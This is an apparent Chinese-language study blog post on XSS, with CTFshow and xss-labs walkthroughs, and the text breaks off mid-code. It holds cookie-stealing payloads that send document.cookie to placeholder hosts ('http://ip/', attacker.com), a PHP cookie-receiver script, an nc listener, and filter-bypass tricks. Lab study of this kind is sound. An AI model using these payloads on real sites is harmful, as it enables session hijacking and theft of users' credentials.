@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>y@7q | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">y@7q</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            关于xss漏洞的学习
+        </div>
+        <div class="post-meta">
+            2025-04-01
+        </div>
+        <div class="post-md">
+            <h1 id="xss的认识和学习"><a href="#xss的认识和学习" class="headerlink" title="xss的认识和学习"></a><code>xss</code>的认识和学习</h1><p>[TOC]</p>
+<p><code>xss</code>平台：<a target="_blank" rel="noopener" href="https://xssaq.com/">XSS平台-XSS测试网站-仅用于安全免费测试</a>（有时候不太好用，推荐用服务器）</p>
+<p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。<strong>攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</strong></p>
+<p>一般的，<code>xss</code>攻击会分为三种情况，危害程度从低到高分别是：<strong>反射型</strong>、<strong>持久型</strong>、<strong>DOM型</strong>。</p>
+<span id="more"></span>
+
+<h2 id="xss漏洞成因"><a href="#xss漏洞成因" class="headerlink" title="xss漏洞成因"></a><code>xss</code>漏洞成因</h2><p>页面会将输入的内容进行渲染并插入到网页的html中，这便导致了攻击者可以构造合适的js代码payload，使得用户再点击链接时自动把注入的内容当作js代码执行，导致用户相关敏感信息泄露。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，<strong>当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。</strong>此类 XSS 通常出现在<strong>网站的搜索栏、用户登录口等地方</strong>，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<h3 id="持久型"><a href="#持久型" class="headerlink" title="持久型"></a>持久型</h3><p><strong>与反射型不同，持久型的攻击代码早在用户进入网站之前就已经存在。</strong>这是因为攻击者已经事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。而反射型的payload并没有进入数据库进行储存而是在请求参数中，这便是他们两个的区别。持久型 XSS 一般出现在<strong>网站留言、评论、博客日志等交互处</strong>。</p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><blockquote>
+<p>DOM (Document Object Model) 译为<em><strong>文档对象模型</strong></em>，是 HTML 和 XML 文档的编程接口。</p>
+<p>换句话说：<strong>HTML DOM 是如何获取、更改、添加或删除 HTML 元素的标准。</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/pic_htmltree.gif" alt="DOM HTML tree"></p>
+<p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码（例如JavaScript）所影响。</p>
+<blockquote>
+<p><em>寻找DOM XSS的本质是做js语言阅读理解题。 –<a target="_blank" rel="noopener" href="http://pikachu:2333/index.php"> Pikachu 漏洞练习平台</a></em></p>
+</blockquote>
+<h2 id="xss的利用"><a href="#xss的利用" class="headerlink" title="xss的利用"></a><code>xss</code>的利用</h2><p>其目的一般都是为了攻击用户，拿到用户的Cookies等信息。</p>
+<h3 id="一、HTML标签与事件属性"><a href="#一、HTML标签与事件属性" class="headerlink" title="一、HTML标签与事件属性"></a>一、HTML标签与事件属性</h3><h4 id="1-脚本执行标签"><a href="#1-脚本执行标签" class="headerlink" title="1. 脚本执行标签"></a>1. <strong>脚本执行标签</strong></h4><table>
+<thead>
+<tr>
+<th align="center">标签</th>
+<th align="center">触发方式</th>
+<th align="center">示例</th>
+<th align="center">特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>&lt;script&gt;</code></td>
+<td align="center">直接嵌入JS代码</td>
+<td align="center"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td align="center">最直接的攻击方式，易被过滤规则拦截</td>
+</tr>
+<tr>
+<td align="center"><code>&lt;img&gt;</code></td>
+<td align="center">利用<code>onerror</code>事件</td>
+<td align="center"><code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</code></td>
+<td align="center">常用于绕过<code>&lt;script&gt;</code>标签过滤</td>
+</tr>
+<tr>
+<td align="center"><code>&lt;svg&gt;</code></td>
+<td align="center">通过<code>onload</code>事件</td>
+<td align="center"><code>&lt;svg onload=alert(1)&gt;</code></td>
+<td align="center">SVG的XML解析特性可绕过部分HTML过滤规则<strong>1****3</strong></td>
+</tr>
+<tr>
+<td align="center"><code>&lt;iframe&gt;</code></td>
+<td align="center">加载JS伪协议或<code>onload</code></td>
+<td align="center"><code>&lt;iframe src=javascript:alert(1)&gt;</code></td>
+<td align="center">可结合跨域资源加载实现攻击链</td>
+</tr>
+<tr>
+<td align="center"><code>&lt;a&gt;</code></td>
+<td align="center"><code>javascript:</code>伪协议</td>
+<td align="center"><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;Click&lt;/a&gt;</code></td>
+<td align="center">依赖用户点击，常用于钓鱼攻击</td>
+</tr>
+</tbody></table>
+<h4 id="2-事件驱动标签"><a href="#2-事件驱动标签" class="headerlink" title="2. 事件驱动标签"></a>2. <strong>事件驱动标签</strong></h4><table>
+<thead>
+<tr>
+<th align="center">事件属性</th>
+<th align="center">触发条件</th>
+<th align="center">示例</th>
+<th align="center">应用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>onload</code></td>
+<td align="center">资源加载完成时触发</td>
+<td align="center"><code>&lt;body onload=alert(1)&gt;</code></td>
+<td align="center">常用于页面或框架初始化阶段</td>
+</tr>
+<tr>
+<td align="center"><code>onerror</code></td>
+<td align="center">资源加载失败时触发</td>
+<td align="center"><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+<td align="center">绕过图片源校验的常用手段</td>
+</tr>
+<tr>
+<td align="center"><code>onmouseover</code></td>
+<td align="center">鼠标悬停时触发</td>
+<td align="center"><code>&lt;img src=1 onmouseover=&quot;prompt(1)&quot;&gt;</code></td>
+<td align="center">需要用户交互，隐蔽性较强</td>
+</tr>
+<tr>
+<td align="center"><code>onfocus</code></td>
+<td align="center">元素获取焦点时触发</td>
+<td align="center"><code>&lt;input onfocus=alert(1) autofocus&gt;</code></td>
+<td align="center">结合<code>autofocus</code>属性实现自动触发</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="二、JavaScript核心方法与属性"><a href="#二、JavaScript核心方法与属性" class="headerlink" title="二、JavaScript核心方法与属性"></a>二、JavaScript核心方法与属性</h3><h4 id="1-敏感数据获取"><a href="#1-敏感数据获取" class="headerlink" title="1. 敏感数据获取"></a>1. <strong>敏感数据获取</strong></h4><table>
+<thead>
+<tr>
+<th align="center">方法&#x2F;属性</th>
+<th align="center">功能</th>
+<th align="center">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>document.cookie</code></td>
+<td align="center">获取当前页面的Cookie</td>
+<td align="center"><code>&lt;script&gt;location.href=&#39;http://ip/?c=&#39;+document.cookie&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td align="center"><code>window.location</code></td>
+<td align="center">控制页面跳转或获取URL</td>
+<td align="center"><code>location.href=&#39;http://attacker.com&#39;</code></td>
+</tr>
+<tr>
+<td align="center"><code>XMLHttpRequest</code></td>
+<td align="center">发送HTTP请求窃取数据</td>
+<td align="center"><code>new XMLHttpRequest().open(&#39;POST&#39;,&#39;http://ip&#39;,true).send(data)</code></td>
+</tr>
+</tbody></table>
+<h4 id="2-代码执行方法"><a href="#2-代码执行方法" class="headerlink" title="2. 代码执行方法"></a>2. <strong>代码执行方法</strong></h4><table>
+<thead>
+<tr>
+<th align="center">方法</th>
+<th align="center">功能</th>
+<th align="center">示例</th>
+<th align="center">绕过技巧</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>eval()</code></td>
+<td align="center">执行字符串形式的JS代码</td>
+<td align="center"><code>eval(&#39;ale&#39;+&#39;rt(1)&#39;)</code></td>
+<td align="center">通过字符串拼接绕过关键字过滤</td>
+</tr>
+<tr>
+<td align="center"><code>setTimeout()</code></td>
+<td align="center">延迟执行代码</td>
+<td align="center"><code>setTimeout(&quot;alert(1)&quot;,0)</code></td>
+<td align="center">结合编码混淆使用</td>
+</tr>
+<tr>
+<td align="center"><code>Function()</code></td>
+<td align="center">动态创建函数</td>
+<td align="center"><code>new Function(&#39;alert(1)&#39;)()</code></td>
+<td align="center">可绕过部分沙箱环境</td>
+</tr>
+</tbody></table>
+<h4 id="3-DOM操作方法"><a href="#3-DOM操作方法" class="headerlink" title="3. DOM操作方法"></a>3. <strong>DOM操作方法</strong></h4><table>
+<thead>
+<tr>
+<th align="center">方法</th>
+<th align="center">功能</th>
+<th align="center">示例</th>
+<th align="center">攻击场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>document.write()</code></td>
+<td align="center">直接写入HTML内容</td>
+<td align="center"><code>document.write(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)</code></td>
+<td align="center">常用于反射型XSS</td>
+</tr>
+<tr>
+<td align="center"><code>innerHTML</code></td>
+<td align="center">动态修改元素内容</td>
+<td align="center"><code>element.innerHTML = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></td>
+<td align="center">需结合用户输入未过滤的场景</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="三、基础payload"><a href="#三、基础payload" class="headerlink" title="三、基础payload"></a>三、基础payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.window.open:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://ip/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2.input</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">3.svg</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;</span></span><br><span class="line">3.iframe</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">4.body</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">5.location.href</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://ip/xss.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">6.img</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="四、攻击方式"><a href="#四、攻击方式" class="headerlink" title="四、攻击方式"></a>四、攻击方式</h3><p>先用<code>&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code>之类的进行测试，找到测试点。</p>
+<h4 id="1-服务器端文件接收"><a href="#1-服务器端文件接收" class="headerlink" title="1.服务器端文件接收"></a>1.服务器端文件接收</h4><p>在服务器上的<code>/var/www/html</code>下写一个用于接收cookie的脚本，然后给写的权限，再通过xss写入等待后台机器人点击即可得到cookies值。</p>
+<h4 id="2-服务器端端口监听（请求外带）"><a href="#2-服务器端端口监听（请求外带）" class="headerlink" title="2. 服务器端端口监听（请求外带）"></a>2. 服务器端端口监听（请求外带）</h4><p>通过nc监听特定端口：<code>nc -lnvp 7777</code>,然后利用xss向相关端口发送请求<code>&lt;script&gt;window.open(&#39;http://ip/&#39;+document.cookie)&lt;/script&gt;</code>然后既可以看到url处带出了cookie值：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-04%20131119.png" alt="屏幕截图 2025-04-04 131119"></p>
+<p>需要注意的是：每次nc只能监听到一次，所以可以多监听几次，所以我觉得还是第一种方法好（</p>
+<p><em>插曲：本来设置的6666端口，但一直不成功，后来一查才知道，6666 刚好在 Chrome 浏览器的默认非安全端口列表里。。。</em><a target="_blank" rel="noopener" href="https://www.cnblogs.com/victorbu/p/11361284.html">神坑之 6666 端口 (默认非安全端口) - VictorBu - 博客园</a></p>
+<h3 id="五、防御"><a href="#五、防御" class="headerlink" title="五、防御"></a>五、防御</h3><ol>
+<li><p>对输入的关键词进行过滤</p>
+</li>
+<li><p>输出转义：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/welcome&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// 对查询参数进行编码，避免反射型XSS攻击</span></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">`<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(req.query.type)&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>encodeURIComponent() 函数可把字符串作为 URI 组件进行编码,从而避免执行恶意代码。</p>
+</li>
+<li></li>
+</ol>
+<h1 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h1><h2 id="CTFshow习题训练（部分）"><a href="#CTFshow习题训练（部分）" class="headerlink" title="CTFshow习题训练（部分）"></a>CTFshow习题训练（部分）</h2><h3 id="316"><a href="#316" class="headerlink" title="316"></a>316</h3><ol>
+<li><p>先在自己服务器服务器的<code>/var/www/html</code>目录下新建<code>xss.php</code>,内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cookie&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="comment">//需要把我们获得的信息写入到我们的本地服务器</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no date input&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-04%20003334.png" alt="屏幕截图 2025-04-04 003334"></p>
+</li>
+<li><p>在留言框上里留言：</p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://ip/xss.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 等待后台bot点击即可得到管理员cookies。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250404004000627.png" alt="image-20250404004000627"></p>
+</li>
+</ol>
+<h3 id="317"><a href="#317" class="headerlink" title="317"></a>317</h3><p>这题在316的基础上过滤了script标签，因此使用body标签，在里面加上onload，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://ip/xss.php/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250404005103964.png" alt="image-20250404005103964"></p>
+<h3 id="320"><a href="#320" class="headerlink" title="320"></a>320</h3><p>过滤了空格，可以用<code>%0A</code>、<code>%0c</code>、<code>%09</code>、 <code>/**/</code>、<code>/</code>来代替之。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/onload=&quot;window.open(&#x27;http://ip/xss.php/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-04%20181012.png" alt="屏幕截图 2025-04-04 181012"></p>
+<h3 id="328"><a href="#328" class="headerlink" title="328"></a>328</h3><p>这题是个注册界面。</p>
+<p><strong>思路</strong>：</p>
+<p>用可用payload注册用户，然后等待后台管理员查看时可以获得cookie，再去管理页面，改cookie，查看账密信息即可得到flag。（注意需要bp抓包然后一个一个放包，把每一个cookie都改了就可以看到了，因为他中间还会发一个包）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250405112316526.png" alt="image-20250405112316526"></p>
+<p>可以看出下面数据的部分显示还得一遍验证，把这个包的cookie再改一遍。</p>
+<h2 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h2><p>我参考了<strong>SkyWT</strong>师傅的wp用来学习:</p>
+<p><a target="_blank" rel="noopener" href="https://skywt.cn/blog/xss-labs-tutorial">xss-labs 通关教程 - 博客</a></p>
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>无过滤，直接弹：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>依旧填上去</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但发现没有弹窗，F12发现被转义了，例如 <code>&lt;</code> 被转义成了 <code>&amp;lt;</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250407203542347.png" alt="image-20250407203542347"></p>
+<p>发现下面还有一个input标签，<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>闭合之后弹窗成功。</p>
+<h3 id="level3-htmlspecialchars-的弱点"><a href="#level3-htmlspecialchars-的弱点" class="headerlink" title="level3 :htmlspecialchars() 的弱点"></a>level3 :<code>htmlspecialchars()</code> 的弱点</h3><p>这里贴一下SkyWT师傅的总结：</p>
+<blockquote>
+<p><strong>本题要求 PHP 版本低于 8.1.0。在 8.1.0 版本中此漏洞已经修复。</strong></p>
+<p>HTML 标准规定了一个叫做<strong>实体（Entity）</strong>的概念。在 HTML 中，<code>&lt;h1&gt;</code> 会被解释为标题标签，那我们如何以文本形式显示出 <code>&lt;h1&gt;</code> 这四个字符呢？答案是使用字符实体，将 <code>&lt;</code> 用 <code>&lt;</code> 替代，将 <code>&gt;</code> 用 <code>&gt;</code> 替代。在 HTML 中，如果我们写 <code>&lt;h1&gt;</code>，就会显示为 <code>&lt;h1&gt;</code> 而不会被解析。</p>
+<p>在 PHP 中，后端需要渲染出一个 HTML 给前端，对传来的字符串就要进行这样的处理，将 <code>&lt;</code> 这样的字符转换为 <code>&lt;</code> 这样的实体。Level 1 就是没有进行这种处理的下场。</p>
+<p>一个通常的做法就是：使用 PHP 自带的 <code>htmlspecialchars()</code> 函数处理字符串，进行字符转义。具体用法可以参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.htmlspecialchars.php">官方文档</a>。</p>
+<p>在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&#39;</code>、<code>&quot;</code> 这五个字符，基本可以防范这里的 XSS 攻击。 但是，8.1.0 以下版本的 PHP 默认只会转义 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code> 这四个字符，不会转义单引号 <code>&#39;</code>。这就给这个函数带来了巨大的安全隐患。</p>
+</blockquote>
+<p>发现input标签中的输入值也被转义了，可以闭合单引号但不能闭合尖括号。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250407205843698.png" alt="image-20250407205843698"></p>
+<p>这里可以使用一些方法标签来触发：例如：<code>&lt;input onfocus=alert(1)&gt;</code> </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> &#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span> &#x27;&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>直接去掉了尖括号。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;scriptalert(1)/script&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但发现没有过滤双引号,于是：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot; onmouseover=alert(1) &quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level5-href-js伪协议"><a href="#level5-href-js伪协议" class="headerlink" title="level5 href js伪协议"></a>level5 href js伪协议</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &lt;<span class="attr">scr_ipt</span>&gt;</span>alert(&#x27;1&#x27;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span> &quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>破坏了原有的script标签，但双引号仍然未过滤。</p>
+<p>尝试了上一题的payload，仍然被过滤：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">o_nmouseover</span>=<span class="string">alert(1)</span> &quot;&quot;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里利用js伪协议进行绕过：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="level6-大小写绕过"><a href="#level6-大小写绕过" class="headerlink" title="level6 大小写绕过"></a>level6 大小写绕过</h3><p>用了上一题的payload，发现把href标签也破坏了。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">hr_ef</span>=<span class="string">javascript:alert(1)</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span 